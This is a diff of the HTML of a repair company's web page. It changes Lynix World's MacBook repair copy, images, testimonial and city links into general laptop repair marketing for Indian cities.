+        • Pricing is estimated for standard laptop models.<br>
+        • Final cost may vary by brand and part availability.<br>
+        • Doorstep service available in major Indian cities.
       </div>
 
       <div style="margin-top: 24px; background: #fffbea; border-left: 4px solid #facc15; padding: 16px; border-radius: 8px;">
-        <strong>💬 What Our Customers Say:</strong>
-        <p style="margin-top: 6px;">⭐⭐⭐⭐⭐ “Got my MacBook screen replaced the same day. Excellent and honest service.”</p>
-        <p style="font-size: 14px; color: #666;">– Aman S., India</p>
+        <strong>💬 Customer Review:</strong>
+        <p style="margin-top: 6px;">⭐⭐⭐⭐⭐ “They fixed my Lenovo laptop at my home in less than 1 hour. Very professional service!”</p>
+        <p style="font-size: 14px; color: #666;">– Rajeev N., Delhi</p>
       </div>
 
       <div style="margin-top: 24px; background: #f3f3f3; padding: 16px; border-radius: 8px;">
-        <strong>Pan-India Service Since 2008</strong>
-        <p style="margin-top: 6px; font-size: 14px; color: #555;">Lynix World offers nationwide doorstep MacBook repairs with over <strong>75,000+ happy customers</strong> across cities like <strong>Delhi, Mumbai, Chandigarh, Bangalore, Pune</strong> and more.</p>
+        <strong>Lynix World – Repairing India Since 2008</strong>
+        <p style="margin-top: 6px; font-size: 14px; color: #555;">With <strong>17+ years</strong> of trusted experience, <strong>Lynix World</strong> has delivered over <strong>75,000+</strong> successful laptop repairs in <strong>Chandigarh, Mohali, Panchkula, Noida, Gurugram</strong> and beyond.</p>
       </div>
     </div>
 
-    <!-- Right Interlinking Content -->
+    <!-- Interlinking Section -->
     <div style="flex: 1 1 35%; min-width: 280px; display: flex; flex-direction: column; gap: 14px;">
-      <img decoding="async" src="https://lynixworld.com/wp-content/uploads/2025/05/macbook-repair-2.webp" alt="MacBook Repair India" style="border-radius: 10px; max-width: 100%;">
+      <img decoding="async" src="https://lynixworld.com/wp-content/uploads/2025/05/repairing-iPhone-1.webp" alt="Laptop Repair India" style="border-radius: 10px; max-width: 100%;">
 
-      <h3 style="font-size: 20px; font-weight: 600; margin-top: 20px; color: #0D1216;">📍 MacBook Repair Available In These Cities.</h3>
+      <h3 style="font-size: 20px; font-weight: 600; margin-top: 20px; color: #0D1216;">📍 Popular Laptop Repair Locations</h3>
 
-      <a href="https://lynixworld.com/macbook-repair/chandigarh/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Chandigarh →</a>
-      <a href="https://lynixworld.com/macbook-repair/mohali/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Mohali →</a>
-      <a href="https://lynixworld.com/macbook-repair/panchkula/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Panchkula →</a>
-      <a href="https://lynixworld.com/macbook-repair/zirakpur/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Zirakpur →</a>
+      <a href="https://lynixworld.com/laptop-repair/chandigarh/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Chandigarh →</a>
+      <a href="https://lynixworld.com/laptop-repair/mohali/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Mohali →</a>
+      <a href="https://lynixworld.com/laptop-repair/panchkula/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Panchkula →</a>
+      <a href="https://lynixworld.com/laptop-repair/zirakpur/" style="background: #FF6A00; color: #fff; padding: 12px 20px; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 600;">Zirakpur →</a>
 
       <div style="margin-top: 20px; background: #fff; border: 1px solid #eee; padding: 16px; border-radius: 10px; text-align: center;">
-        <strong>💬 Speak with a Mac Expert</strong>
-        <p style="font-size: 14px; color: #555; margin-top: 8px;">Not sure about the issue? Our engineers will help you out via WhatsApp.</p>
+        <strong>💬 Speak with a Repair Expert</strong>
+        <p style="font-size: 14px; color: #555; margin-top: 8px;">Got questions? Chat with our team on WhatsApp</p>
         <a href="https://wa.me/918000002218" target="_blank" style="margin-top: 10px; display: inline-block; background: #25D366; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-weight: 600;">WhatsApp Now</a>
       </div>
     </div>
@@ -432,42 +438,42 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 		</div>
 					</div>
 		</section>
-		<div class="elementor-element elementor-element-fca5885 e-flex e-con-boxed e-con e-parent" data-id="fca5885" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-ef89c9e e-flex e-con-boxed e-con e-parent" data-id="ef89c9e" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-d446cfd e-con-full e-flex e-con e-child" data-id="d446cfd" data-element_type="container">
-				<div class="elementor-element elementor-element-62c76a9 elementor-widget elementor-widget-heading" data-id="62c76a9" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default">What Makes <span style="color:#FE6E00">Lynix World</span>
- Stand Out?</h2>				</div>
-				<div class="elementor-element elementor-element-e28d1ea elementor-align-left elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="e28d1ea" data-element_type="widget" data-widget_type="icon-list.default">
+		<div class="elementor-element elementor-element-e0ab854 e-con-full e-flex e-con e-child" data-id="e0ab854" data-element_type="container">
+				<div class="elementor-element elementor-element-cb05758 elementor-widget elementor-widget-heading" data-id="cb05758" data-element_type="widget" data-widget_type="heading.default">
+					<h2 class="elementor-heading-title elementor-size-default">Why <span style="color:#FE6E00">Lynix World</span>
+ Laptop Repairs are the Best</h2>				</div>
+				<div class="elementor-element elementor-element-e21d319 elementor-align-left elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="e21d319" data-element_type="widget" data-widget_type="icon-list.default">
 							<ul class="elementor-icon-list-items">
 							<li class="elementor-icon-list-item">
 											<span class="elementor-icon-list-icon">
 							<svg aria-hidden="true" class="e-font-icon-svg e-fas-hand-point-right" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M512 199.652c0 23.625-20.65 43.826-44.8 43.826h-99.851c16.34 17.048 18.346 49.766-6.299 70.944 14.288 22.829 2.147 53.017-16.45 62.315C353.574 425.878 322.654 448 272 448c-2.746 0-13.276-.203-16-.195-61.971.168-76.894-31.065-123.731-38.315C120.596 407.683 112 397.599 112 385.786V214.261l.002-.001c.011-18.366 10.607-35.889 28.464-43.845 28.886-12.994 95.413-49.038 107.534-77.323 7.797-18.194 21.384-29.084 40-29.092 34.222-.014 57.752 35.098 44.119 66.908-3.583 8.359-8.312 16.67-14.153 24.918H467.2c23.45 0 44.8 20.543 44.8 43.826zM96 200v192c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V200c0-13.255 10.745-24 24-24h48c13.255 0 24 10.745 24 24zM68 368c0-11.046-8.954-20-20-20s-20 8.954-20 20 8.954 20 20 20 20-8.954 20-20z"></path></svg>						</span>
-										<span class="elementor-icon-list-text">Repairs Done at Your Location: No fix, no fees. Proper invoices with warranty. Professional work.</span>
+										<span class="elementor-icon-list-text">Home Convenience: 90% of the repairs are done in front of your eyes, either at home or the office.</span>
 									</li>
 								<li class="elementor-icon-list-item">
 											<span class="elementor-icon-list-icon">
 							<svg aria-hidden="true" class="e-font-icon-svg e-fas-hand-point-right" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M512 199.652c0 23.625-20.65 43.826-44.8 43.826h-99.851c16.34 17.048 18.346 49.766-6.299 70.944 14.288 22.829 2.147 53.017-16.45 62.315C353.574 425.878 322.654 448 272 448c-2.746 0-13.276-.203-16-.195-61.971.168-76.894-31.065-123.731-38.315C120.596 407.683 112 397.599 112 385.786V214.261l.002-.001c.011-18.366 10.607-35.889 28.464-43.845 28.886-12.994 95.413-49.038 107.534-77.323 7.797-18.194 21.384-29.084 40-29.092 34.222-.014 57.752 35.098 44.119 66.908-3.583 8.359-8.312 16.67-14.153 24.918H467.2c23.45 0 44.8 20.543 44.8 43.826zM96 200v192c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V200c0-13.255 10.745-24 24-24h48c13.255 0 24 10.745 24 24zM68 368c0-11.046-8.954-20-20-20s-20 8.954-20 20 8.954 20 20 20 20-8.954 20-20z"></path></svg>						</span>
-										<span class="elementor-icon-list-text">No Visiting Charges: Get a free diagnosis without having to pay anything.</span>
+										<span class="elementor-icon-list-text">Free Diagnosis: No hidden prices, no fixed no fees.</span>
 									</li>
 								<li class="elementor-icon-list-item">
 											<span class="elementor-icon-list-icon">
 							<svg aria-hidden="true" class="e-font-icon-svg e-fas-hand-point-right" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M512 199.652c0 23.625-20.65 43.826-44.8 43.826h-99.851c16.34 17.048 18.346 49.766-6.299 70.944 14.288 22.829 2.147 53.017-16.45 62.315C353.574 425.878 322.654 448 272 448c-2.746 0-13.276-.203-16-.195-61.971.168-76.894-31.065-123.731-38.315C120.596 407.683 112 397.599 112 385.786V214.261l.002-.001c.011-18.366 10.607-35.889 28.464-43.845 28.886-12.994 95.413-49.038 107.534-77.323 7.797-18.194 21.384-29.084 40-29.092 34.222-.014 57.752 35.098 44.119 66.908-3.583 8.359-8.312 16.67-14.153 24.918H467.2c23.45 0 44.8 20.543 44.8 43.826zM96 200v192c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V200c0-13.255 10.745-24 24-24h48c13.255 0 24 10.745 24 24zM68 368c0-11.046-8.954-20-20-20s-20 8.954-20 20 8.954 20 20 20 20-8.954 20-20z"></path></svg>						</span>
-										<span class="elementor-icon-list-text">Repair of Defective Components: In case we can't repair it at the doorstep, we will not pick up your entire macbook just a faulty part will be taken for repair.</span>
+										<span class="elementor-icon-list-text">Selective Diagnosis: We only repair that part that is damaged or not in working condition, unlike service centres where the entire machine is changed.</span>
 									</li>
 								<li class="elementor-icon-list-item">
 											<span class="elementor-icon-list-icon">
 							<svg aria-hidden="true" class="e-font-icon-svg e-fas-hand-point-right" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M512 199.652c0 23.625-20.65 43.826-44.8 43.826h-99.851c16.34 17.048 18.346 49.766-6.299 70.944 14.288 22.829 2.147 53.017-16.45 62.315C353.574 425.878 322.654 448 272 448c-2.746 0-13.276-.203-16-.195-61.971.168-76.894-31.065-123.731-38.315C120.596 407.683 112 397.599 112 385.786V214.261l.002-.001c.011-18.366 10.607-35.889 28.464-43.845 28.886-12.994 95.413-49.038 107.534-77.323 7.797-18.194 21.384-29.084 40-29.092 34.222-.014 57.752 35.098 44.119 66.908-3.583 8.359-8.312 16.67-14.153 24.918H467.2c23.45 0 44.8 20.543 44.8 43.826zM96 200v192c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V200c0-13.255 10.745-24 24-24h48c13.255 0 24 10.745 24 24zM68 368c0-11.046-8.954-20-20-20s-20 8.954-20 20 8.954 20 20 20 20-8.954 20-20z"></path></svg>						</span>
-										<span class="elementor-icon-list-text">Warranty Offered: Three months warranty on repair and one year for parts replacement.</span>
+										<span class="elementor-icon-list-text">Warranty Assurance: The warranty period is 3 months for the repairs done and 1 year if parts are replaced.</span>
 									</li>
 								<li class="elementor-icon-list-item">
 											<span class="elementor-icon-list-icon">
 							<svg aria-hidden="true" class="e-font-icon-svg e-fas-hand-point-right" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M512 199.652c0 23.625-20.65 43.826-44.8 43.826h-99.851c16.34 17.048 18.346 49.766-6.299 70.944 14.288 22.829 2.147 53.017-16.45 62.315C353.574 425.878 322.654 448 272 448c-2.746 0-13.276-.203-16-.195-61.971.168-76.894-31.065-123.731-38.315C120.596 407.683 112 397.599 112 385.786V214.261l.002-.001c.011-18.366 10.607-35.889 28.464-43.845 28.886-12.994 95.413-49.038 107.534-77.323 7.797-18.194 21.384-29.084 40-29.092 34.222-.014 57.752 35.098 44.119 66.908-3.583 8.359-8.312 16.67-14.153 24.918H467.2c23.45 0 44.8 20.543 44.8 43.826zM96 200v192c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V200c0-13.255 10.745-24 24-24h48c13.255 0 24 10.745 24 24zM68 368c0-11.046-8.954-20-20-20s-20 8.954-20 20 8.954 20 20 20 20-8.954 20-20z"></path></svg>						</span>
-										<span class="elementor-icon-list-text">Reliable Experts: Experts with 17 years of experience and loyal service from the Lynix world.</span>
+										<span class="elementor-icon-list-text">Experienced Technicians: We have experienced engineers who have 10 years of experience.</span>
 									</li>
 						</ul>
 						</div>
-				<div class="elementor-element elementor-element-b71ec66 elementor-tablet-align-center elementor-align-left elementor-widget elementor-widget-button" data-id="b71ec66" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-element elementor-element-8a15b74 elementor-tablet-align-center elementor-align-left elementor-widget elementor-widget-button" data-id="8a15b74" data-element_type="widget" data-widget_type="button.default">
 										<a class="elementor-button elementor-button-link elementor-size-sm" href="tel:+918000002218">
 						<span class="elementor-button-content-wrapper">
 						<span class="elementor-button-icon">
@@ -477,89 +483,89 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 					</a>
 								</div>
 				</div>
-		<div class="elementor-element elementor-element-0c41f0b e-con-full e-flex e-con e-child" data-id="0c41f0b" data-element_type="container">
-		<div class="elementor-element elementor-element-528079d e-con-full e-flex e-con e-child" data-id="528079d" data-element_type="container">
-				<div class="elementor-element elementor-element-5d763c0 elementor-widget elementor-widget-image" data-id="5d763c0" data-element_type="widget" data-widget_type="image.default">
-															<img loading="lazy" decoding="async" width="1120" height="1120" src="https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician.webp" class="attachment-full size-full wp-image-7317" alt="Cartoon MacBook repair technician holding tools at a desk in a computer office." srcset="https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician.webp 1120w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-300x300.webp 300w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-1024x1024.webp 1024w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-150x150.webp 150w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-768x768.webp 768w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-990x990.webp 990w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-441x441.webp 441w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-100x100.webp 100w, https://lynixworld.com/wp-content/uploads/2025/05/MacBook-repair-technician-800x800.webp 800w" sizes="(max-width: 1120px) 100vw, 1120px" />															</div>
+		<div class="elementor-element elementor-element-b8bc0ba e-con-full e-flex e-con e-child" data-id="b8bc0ba" data-element_type="container">
+		<div class="elementor-element elementor-element-aa3c9d3 e-con-full e-flex e-con e-child" data-id="aa3c9d3" data-element_type="container">
+				<div class="elementor-element elementor-element-939ef30 elementor-widget elementor-widget-image" data-id="939ef30" data-element_type="widget" data-widget_type="image.default">
+															<img loading="lazy" decoding="async" width="1120" height="1120" src="https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1.jpg" class="attachment-full size-full wp-image-7273" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1.jpg 1120w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-300x300.jpg 300w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-1024x1024.jpg 1024w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-150x150.jpg 150w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-768x768.jpg 768w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-990x990.jpg 990w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-441x441.jpg 441w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-100x100.jpg 100w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-1-800x800.jpg 800w" sizes="(max-width: 1120px) 100vw, 1120px" />															</div>
 				</div>
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-be11ad1 e-flex e-con-boxed e-con e-parent" data-id="be11ad1" data-element_type="container">
+		<div class="elementor-element elementor-element-e3e2d10 e-flex e-con-boxed e-con e-parent" data-id="e3e2d10" data-element_type="container">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-95100eb e-con-full e-flex e-con e-child" data-id="95100eb" data-element_type="container">
-		<div class="elementor-element elementor-element-442a96d e-con-full e-flex e-con e-child" data-id="442a96d" data-element_type="container">
-				<div class="elementor-element elementor-element-4658732 elementor-widget elementor-widget-image" data-id="4658732" data-element_type="widget" data-widget_type="image.default">
-															<img loading="lazy" decoding="async" width="1120" height="1120" src="https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook.webp" class="attachment-full size-full wp-image-7316" alt="Cartoon computer technician fixing a MacBook with tools on the desk in a repair shop." srcset="https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook.webp 1120w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-300x300.webp 300w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-1024x1024.webp 1024w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-150x150.webp 150w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-768x768.webp 768w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-990x990.webp 990w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-441x441.webp 441w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-100x100.webp 100w, https://lynixworld.com/wp-content/uploads/2025/05/fixing-a-MacBook-800x800.webp 800w" sizes="(max-width: 1120px) 100vw, 1120px" />															</div>
+		<div class="elementor-element elementor-element-d0d0a0d e-con-full e-flex e-con e-child" data-id="d0d0a0d" data-element_type="container">
+		<div class="elementor-element elementor-element-242e8a2 e-con-full e-flex e-con e-child" data-id="242e8a2" data-element_type="container">
+				<div class="elementor-element elementor-element-2d3815b elementor-widget elementor-widget-image" data-id="2d3815b" data-element_type="widget" data-widget_type="image.default">
+															<img loading="lazy" decoding="async" width="1120" height="1120" src="https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2.jpg" class="attachment-full size-full wp-image-7270" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2.jpg 1120w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-300x300.jpg 300w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-1024x1024.jpg 1024w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-150x150.jpg 150w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-768x768.jpg 768w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-990x990.jpg 990w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-441x441.jpg 441w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-100x100.jpg 100w, https://lynixworld.com/wp-content/uploads/2025/04/laptop-repair-2-800x800.jpg 800w" sizes="(max-width: 1120px) 100vw, 1120px" />															</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-dbb57fb e-con-full e-flex e-con e-child" data-id="dbb57fb" data-element_type="container">
-				<div class="elementor-element elementor-element-bea6624 elementor-widget elementor-widget-heading" data-id="bea6624" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default">Professional Help and Trusted 
- <span style="color:#FE6E00">MacBook Repair Services 
-</span></h2>				</div>
-				<div class="elementor-element elementor-element-34350ca elementor-widget elementor-widget-text-editor" data-id="34350ca" data-element_type="widget" data-widget_type="text-editor.default">
-									<p><span style="font-weight: 400;">Having issues with your MacBook? Then getting the device looked at by the right repair center is crucial. We at Lynix World, offer specialized MacBook repair services that pay attention to care and to ensure the Apple laptop functions optimally. Our technicians specialize in diagnosing and fixing all models of MacBook computers. Whether the issue is with the screen, battery, keyboard, or the computer is overheating, our staff is trained to assist you. We ensure that our systematic approach to repairs—from initial evaluation to both intermediate and final inspections—means that your device is thoroughly assessed and looked after at every stage. We know how to swiftly and effectively restore the device using our years of expertise in Apple laptop repair.</span></p>								</div>
+		<div class="elementor-element elementor-element-dac7b9a e-con-full e-flex e-con e-child" data-id="dac7b9a" data-element_type="container">
+				<div class="elementor-element elementor-element-ee25303 elementor-widget elementor-widget-heading" data-id="ee25303" data-element_type="widget" data-widget_type="heading.default">
+					<h2 class="elementor-heading-title elementor-size-default">Fast, Friendly 
+ <span style="color:#FE6E00">Laptop Repair
+</span> You Can Trust</h2>				</div>
+				<div class="elementor-element elementor-element-a83d873 elementor-widget elementor-widget-text-editor" data-id="a83d873" data-element_type="widget" data-widget_type="text-editor.default">
+									<p><span style="font-weight: 400;">If your laptop has ever frozen right before a deadline or gotten hot enough to burn your laptop, you know the panic. At Lynix World, we fix that panic with friendly, fast laptop repair. Whether your screen is blank, the battery won’t charge, the fans are screaming, or a stubborn update just won’t finish, we work on all the big brands and use the right tools for each job. Your laptop is your school, your side hustle, and your weekend movie theatre, so we treat it with care. Our techs start with a complete check-up to find the exact problem, explain it in plain English, and suggest the best fix. Each repair is done step by step, so you can get back to video calls, virtual classes, or the next video game without missing a moment.</span></p>								</div>
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-bcfd56d e-flex e-con-boxed e-con e-parent" data-id="bcfd56d" data-element_type="container">
+		<div class="elementor-element elementor-element-70a6dcd e-flex e-con-boxed e-con e-parent" data-id="70a6dcd" data-element_type="container">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-4c2a878 e-con-full e-flex e-con e-child" data-id="4c2a878" data-element_type="container">
-				<div class="elementor-element elementor-element-7700dd0 elementor-widget elementor-widget-heading" data-id="7700dd0" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default">Dependable MacBook Service Center with Options for <span style="color:#FE6E00">Repairs on the Same Day
-</span>
-
+		<div class="elementor-element elementor-element-ab19a92 e-con-full e-flex e-con e-child" data-id="ab19a92" data-element_type="container">
+				<div class="elementor-element elementor-element-ff93e64 elementor-widget elementor-widget-heading" data-id="ff93e64" data-element_type="widget" data-widget_type="heading.default">
+					<h2 class="elementor-heading-title elementor-size-default">Speedy, Trusted Same-Day <span style="color:#FE6E00">Laptop Repair
+</span> Right When You Need It
 
 </h2>				</div>
-				<div class="elementor-element elementor-element-e4e8c1b elementor-widget elementor-widget-text-editor" data-id="e4e8c1b" data-element_type="widget" data-widget_type="text-editor.default">
-									<p><span style="font-weight: 400;">Most people call us when they need MacBook repairs because we are reliable and swift with our work. We fix most problems on the same day they are reported. With us, every component for your Apple laptop is of high quality, and it is fixed with high-level gadget work. We fix problems ranging from sudden shut downs, software problems, charging issues and so on. We repair gadgets with the most efficient methods and keep the people waiting as little as possible. We keep our customers updated on the matter so that they never feel anxious. Fixing gadgets is a sensitive process, and we focus on restoring every broken piece with utmost integrity. If speed and skill, alongside constant support are what you need, Lynix World is the one giving you the most trusted laptop repairs.</span></p>								</div>
+				<div class="elementor-element elementor-element-caa6633 elementor-widget elementor-widget-text-editor" data-id="caa6633" data-element_type="widget" data-widget_type="text-editor.default">
+									<p><span id="input-sentence~31">Walk into our laptop repair center, and you’ll see we put speed first, but we never cut corners.</span> <span id="input-sentence~32">Most common laptop troubles—like dead chargers, slow startups, flickering screens, or systems that freeze—can be fixed and back in your hands the same day.</span> <span id="input-sentence~33">We have a simple process.</span> <span id="input-sentence~34">We do work our magic on the system.</span> <span id="input-sentence~35">We replace and return the constituents that genuinely matter.</span> <span id="input-sentence~36">We repair and return the system with all the files still secure.</span> <span id="input-sentence~37">We repair quickly and reliably.</span> <span id="input-sentence~38">We also update every step of the process so our clients are never kept in the dark.</span> <span id="input-sentence~39">As a system repair service, we replace all the defective parts and repair the system.</span> <span id="input-sentence~40">The rest of the constituents are strictly genuine.</span></p>								</div>
 				</div>
-		<div class="elementor-element elementor-element-dae7a09 e-con-full e-flex e-con e-child" data-id="dae7a09" data-element_type="container">
-				<div class="elementor-element elementor-element-05bb7e7 elementor-widget elementor-widget-image" data-id="05bb7e7" data-element_type="widget" data-widget_type="image.default">
-															<img loading="lazy" decoding="async" width="800" height="800" src="https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-1024x1024.webp" class="attachment-large size-large wp-image-7761" alt="Smiling cartoon technician checking MacBook with voltage tester." srcset="https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-1024x1024.webp 1024w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-300x300.webp 300w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-150x150.webp 150w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-768x768.webp 768w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-990x990.webp 990w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-441x441.webp 441w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-100x100.webp 100w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook-800x800.webp 800w, https://lynixworld.com/wp-content/uploads/2025/05/technician-checking-MacBook.webp 1120w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+		<div class="elementor-element elementor-element-5456dcc e-con-full e-flex e-con e-child" data-id="5456dcc" data-element_type="container">
+				<div class="elementor-element elementor-element-fc2c4ac elementor-widget elementor-widget-image" data-id="fc2c4ac" data-element_type="widget" data-widget_type="image.default">
+															<img loading="lazy" decoding="async" width="800" height="800" src="https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-1024x1024.webp" class="attachment-large size-large wp-image-7681" alt="Cartoon engineer repairing laptop internals with diagnostic tools on a desk." srcset="https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-1024x1024.webp 1024w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-300x300.webp 300w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-150x150.webp 150w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-768x768.webp 768w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-990x990.webp 990w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-441x441.webp 441w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-100x100.webp 100w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals-800x800.webp 800w, https://lynixworld.com/wp-content/uploads/2025/05/repairing-laptop-internals.webp 1120w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-735c80c e-flex e-con-boxed e-con e-parent" data-id="735c80c" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-7579626 e-flex e-con-boxed e-con e-parent" data-id="7579626" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-815e8ed elementor-widget elementor-widget-heading" data-id="815e8ed" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-element elementor-element-2e9ac07 elementor-widget elementor-widget-heading" data-id="2e9ac07" data-element_type="widget" data-widget_type="heading.default">
 					<h2 class="elementor-heading-title elementor-size-default"><span style="color:#FE6E00">Compare Us With</span>  Others</h2>				</div>
-				<div class="elementor-element elementor-element-e04c9c2 elementor-widget elementor-widget-text-editor" data-id="e04c9c2" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-1ff9da8 elementor-widget elementor-widget-text-editor" data-id="1ff9da8" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>We take charges only for successful repairs, with our ‘No Fix No Fee’ policy.</p>								</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-b58c89b e-flex e-con-boxed e-con e-parent" data-id="b58c89b" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-					<div class="e-con-inner"><div class="elementor-element elementor-element-f28e5ba e-con-full e-flex e-con e-child" data-id="f28e5ba" data-element_type="container">
-		<div class="elementor-element elementor-element-14f78ca e-con-full e-flex e-con e-child" data-id="14f78ca" data-element_type="container">
-		<div class="elementor-element elementor-element-09b339d e-con-full e-flex e-con e-child" data-id="09b339d" data-element_type="container">
-				<div class="elementor-element elementor-element-13e18a1 service_card_heading elementor-widget elementor-widget-heading" data-id="13e18a1" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-5e5810c e-flex e-con-boxed e-con e-parent" data-id="5e5810c" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-3d62401 e-con-full e-flex e-con e-child" data-id="3d62401" data-element_type="container">
+		<div class="elementor-element elementor-element-1a3230f e-con-full e-flex e-con e-child" data-id="1a3230f" data-element_type="container">
+		<div class="elementor-element elementor-element-e8dff99 e-con-full e-flex e-con e-child" data-id="e8dff99" data-element_type="container">
